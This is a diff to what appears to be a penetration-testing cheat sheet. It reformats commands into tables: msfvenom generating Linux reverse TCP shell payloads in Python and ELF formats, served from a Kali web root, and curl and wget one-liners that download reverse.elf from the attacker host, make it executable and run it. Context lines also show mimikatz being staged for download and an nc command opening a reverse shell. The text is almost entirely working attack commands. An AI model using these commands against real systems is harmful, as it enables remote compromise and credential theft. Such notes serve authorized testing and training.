@@ -32,9 +32,10 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 
 Linux:
 
-```console
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py
-```
+|   |   |
+|---|---|
+|Python|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py`|
+|Executable and Linkable Format (elf)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
 
 Windows:
 
@@ -86,9 +87,10 @@ nc -nv 192.168.17.10 4444 -e /bin/sh
 
 ## 3.2. Execute Linux reverse shell TCP payload
 
-```console
-curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf
-```
+|   |   |
+|---|---|
+|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
+|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 
 # 4. Uploading files from Windows to Kali
 
